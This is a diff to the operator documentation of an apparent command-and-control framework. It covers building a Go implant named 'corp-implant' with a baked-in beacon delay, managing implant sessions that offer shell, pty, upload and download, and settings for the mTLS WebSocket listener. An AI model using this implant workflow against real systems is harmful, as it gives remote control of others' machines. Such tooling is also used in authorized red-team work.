@@ -40,11 +40,16 @@ use ws-mtls-listener
 gen poly-builder                   # picks up the live listener profile
   set lang go
   set name corp-implant
+  set beacon 10                     # reconnect/beacon delay: seconds between
+                                    # reconnect attempts, baked into the binary
   run                              # artifact lands in YOUR cwd, registered with keep=True
 sessions                           # implants show up as wraith sessions on connect
 use <sid>                          # inner shell: shell / pty / sysinfo / upload / download / die
-  pty                              # INTERACTIVE shell (bash -i on a real pty) — every
-                                   # line you type goes in raw; `.q` returns to verbs
+  pty                              # INTERACTIVE shell, ssh-style RAW mode (go implants
+                                   # on linux): remote echo/history/Tab-completion,
+                                   # Ctrl+C passthrough, full-screen apps (vim, htop),
+                                   # terminal size follows your window (SIGWINCH).
+                                   # Ctrl+] returns to verbs (.q leaves pty mode)
 ```
 
 ## Dependencies (module-owned)
@@ -79,7 +84,8 @@ sent over the wire that the implant could not have read from its own binary.
 - **Shared token on top**: a wrong token with a VALID client cert is logged as
   a `warn` (cert-theft signal), not a silent drop.
 - **Caps everywhere**: frames ≤ 4 MiB (`ws max_size`), download cap 4 MiB,
-  10 s hello window, 120 s shell exec timeout (Go), 5–8 s jittered reconnect.
+  10 s hello window, 120 s shell exec timeout (Go), reconnect jitter on a
+  `beacon`-seconds base baked by the builder (default 5 s).
 - **No temp artifacts**: builder output goes to the operator's cwd or an
   explicit `output` path, 0o700, registered with `keep=True` — the store's
   `/tmp|/var/tmp|/dev/shm|%TEMP%` refusal never has to fire.
